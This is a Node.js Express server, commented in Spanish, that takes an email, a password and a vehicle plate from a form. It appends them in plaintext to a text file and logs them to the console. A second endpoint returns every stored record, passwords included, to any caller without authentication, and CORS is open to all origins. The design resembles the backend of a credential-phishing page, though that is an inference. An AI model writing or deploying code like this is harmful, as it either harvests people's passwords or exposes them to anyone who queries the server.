const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Crear directorio de datos si no existe
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
  fs.mkdirSync(dataDir, { recursive: true });
}

// Endpoint para guardar datos del formulario
app.post('/api/register', (req, res) => {
  try {
    const { email, password, placa } = req.body;
    
    // Validar que los campos obligatorios estén presentes
    if (!email || !password) {
      return res.status(400).json({
        success: false,
        message: 'Email y contraseña son campos obligatorios'
      });
    }

    // Crear objeto con los datos
    const userData = {
      email,
      password,
      placa: placa || 'No especificada',
      timestamp: new Date().toISOString(),
      date: new Date().toLocaleDateString('es-ES'),
      time: new Date().toLocaleTimeString('es-ES')
    };

    // Crear línea de texto para el archivo
    const dataLine = `${userData.date} ${userData.time} | Email: ${userData.email} | Contraseña: ${userData.password} | Placa: ${userData.placa}\n`;
    
    // Ruta del archivo de datos
    const filePath = path.join(dataDir, 'registros.txt');
    
    // Escribir en el archivo
    fs.appendFileSync(filePath, dataLine, 'utf8');
    
    console.log('Nuevo registro guardado:', userData);
    
    res.json({
      success: true,
      message: 'Registro guardado exitosamente',
      data: {
        email: userData.email,
        timestamp: userData.timestamp
      }
    });

  } catch (error) {
    console.error('Error al guardar registro:', error);
    res.status(500).json({
      success: false,
      message: 'Error interno del servidor'
    });
  }
});

// Endpoint para obtener todos los registros (para revisar los datos)
app.get('/api/registros', (req, res) => {
  try {
    const filePath = path.join(dataDir, 'registros.txt');
    
    if (!fs.existsSync(filePath)) {
      return res.json({
        success: true,
        data: [],
        message: 'No hay registros aún'
      });
    }
    
    const fileContent = fs.readFileSync(filePath, 'utf8');
    const lines = fileContent.trim().split('\n').filter(line => line.trim());
    
    const registros = lines.map((line, index) => ({
      id: index + 1,
      data: line
    }));
    
    res.json({
      success: true,
      data: registros,
      total: registros.length
    });
    
  } catch (error) {
    console.error('Error al leer registros:', error);
    res.status(500).json({
      success: false,
      message: 'Error al leer los registros'
    });
  }
});

// Endpoint de salud del servidor
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    message: 'Servidor funcionando correctamente',
    timestamp: new Date().toISOString()
  });
});

// Servir archivos estáticos (opcional)
app.use(express.static(path.join(__dirname, 'public')));

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`🚀 Servidor ejecutándose en puerto ${PORT}`);
  console.log(`📁 Datos se guardan en: ${dataDir}`);
  console.log(`🌐 Health check: http://localhost:${PORT}/api/health`);
});

module.exports = app;
